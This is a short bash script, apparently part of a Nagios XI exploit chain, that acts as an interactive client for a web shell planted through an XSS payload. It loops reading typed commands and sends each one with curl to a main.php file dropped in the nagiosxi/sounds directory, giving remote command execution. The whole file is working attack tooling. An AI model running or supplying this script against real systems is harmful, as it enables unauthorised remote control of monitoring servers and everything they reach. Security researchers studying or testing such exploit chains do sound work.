#!/bin/bash

# Once you've delivered the web setup-web-shell.js payload via XSS, you can use this script to repeatedly send it commands

while true;do
  printf "\n$ "; read cmd
  curl --silent -G 'http://nagios.lan/nagiosxi/sounds/main.php' --data-urlencode "1=${cmd}"
done